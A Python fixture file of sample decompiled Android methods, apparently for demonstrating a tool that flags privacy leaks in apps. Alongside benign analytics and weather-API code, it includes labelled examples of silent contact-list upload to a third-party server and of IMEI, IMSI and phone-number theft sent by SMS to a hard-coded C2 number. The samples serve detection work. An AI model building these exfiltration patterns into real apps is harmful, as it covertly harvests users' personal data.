"""
Sample decompiled code snippets for the demo.
In a real deployment these come from Jadx/Apktool decompilation output.
"""

SAMPLE_DECOMPILED_CODE = {
    # Calculator app — device identifier collection
    "com.example.calculator.util.DeviceHelper.getIdentifier()": """\
public String getIdentifier() {
    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String imei = null;
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            imei = tm.getDeviceId();
        }
    }
    // On Android 10+, getDeviceId() always returns null — fall back to ANDROID_ID
    if (imei == null) {
        imei = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    return imei;
}
""",

    "com.example.calculator.util.DeviceHelper.getAnonymousId()": """\
public String getAnonymousId() {
    // Returns ANDROID_ID — a resettable, app-scoped random identifier
    return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
}
""",

    "com.example.calculator.analytics.AnalyticsManager.buildPayload(String)": """\
public JSONObject buildPayload(String deviceId) throws JSONException {
    JSONObject payload = new JSONObject();
    payload.put("device_id", deviceId);
    payload.put("app_version", BuildConfig.VERSION_NAME);
    payload.put("feature_usage", getFeatureUsageStats());
    // No PII fields — only anonymous usage counters
    return payload;
}
""",

    "com.example.calculator.analytics.AnalyticsManager.flush()": """\
public void flush() {
    if (!isOptedIn()) {
        return;  // user opted out — no transmission
    }
    String deviceId = deviceHelper.getAnonymousId();
    JSONObject payload = buildPayload(deviceId);
    httpHelper.post("https://analytics.supercalculator.example.com/events",
                    payload.toString().getBytes(StandardCharsets.UTF_8));
}
""",

    # Weather app — location to weather API
    "com.example.weather.location.LocationProvider.getCurrentLocation()": """\
public Location getCurrentLocation() {
    if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
        return null;  // permission not granted — returns null, flow terminates
    }
    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    return lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
}
""",

    "com.example.weather.api.WeatherApiClient.buildRequest(Location)": """\
public WeatherRequest buildRequest(Location loc) {
    if (loc == null) return null;
    return new WeatherRequest(loc.getLatitude(), loc.getLongitude(),
                               "metric", Locale.getDefault().getLanguage());
    // Only lat/lon sent — no device ID, no user identity
}
""",

    "com.example.weather.api.WeatherApiClient.fetchForecast(WeatherRequest)": """\
public Forecast fetchForecast(WeatherRequest req) {
    if (req == null) return null;
    // Sends location to Open Weather Map API — well-known, benign service
    Request httpReq = new Request.Builder()
        .url("https://api.openweathermap.org/data/2.5/forecast"
             + "?lat=" + req.lat + "&lon=" + req.lon
             + "&appid=" + API_KEY)
        .build();
    return gson.fromJson(client.newCall(httpReq).execute().body().string(), Forecast.class);
}
""",

    # Social app — contacts exfiltration (True Positive)
    "com.example.socialapp.contacts.ContactSyncer.queryAll()": """\
public List<Contact> queryAll() {
    // Reads ALL device contacts — names, phone numbers, email addresses
    ContentResolver cr = context.getContentResolver();
    Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    List<Contact> contacts = new ArrayList<>();
    while (cursor != null && cursor.moveToNext()) {
        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
        String phone = getPhoneNumber(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)));
        contacts.add(new Contact(name, phone));
    }
    return contacts;  // returns ALL contacts with names and phone numbers
}
""",

    "com.example.socialapp.contacts.ContactSyncer.serializeContacts(List)": """\
public byte[] serializeContacts(List<Contact> contacts) {
    // Serializes full contact list including names and phone numbers to JSON
    JSONArray arr = new JSONArray();
    for (Contact c : contacts) {
        JSONObject obj = new JSONObject();
        obj.put("name", c.displayName);
        obj.put("phone", c.phoneNumber);
        obj.put("device_id", Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID));
        arr.put(obj);
    }
    return arr.toString().getBytes(StandardCharsets.UTF_8);
}
""",

    "com.example.socialapp.network.UploadService.uploadContacts(byte[])": """\
public void uploadContacts(byte[] payload) {
    // Uploads contact data to third-party server — no user consent dialog shown
    RequestBody body = RequestBody.create(MediaType.parse("application/json"), payload);
    Request request = new Request.Builder()
        .url("https://data-sync.friendconnect-analytics.io/contacts/ingest")
        .post(body)
        .build();
    client.newCall(request).enqueue(uploadCallback);
    // Note: "friendconnect-analytics.io" is a third-party analytics domain
}
""",

    # Malware app — IMSI to SMS exfiltration
    "com.example.malware.SIMInfoCollector.collect()": """\
public String collect() {
    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String imsi = tm.getSubscriberId();
    String imei = tm.getDeviceId();
    String phoneNum = tm.getLine1Number();
    // Aggregates multiple sensitive identifiers into a single string
    return imei + "|" + imsi + "|" + phoneNum;
}
""",

    "com.example.malware.Exfiltrator.buildSMS(String)": """\
public String buildSMS(String payload) {
    // Hard-coded C2 number — classic malware pattern
    String c2Number = "+1555" + obfuscate("0192837465");
    SmsManager.getDefault().sendTextMessage(c2Number, null, payload, null, null);
    return payload;
}
""",
}
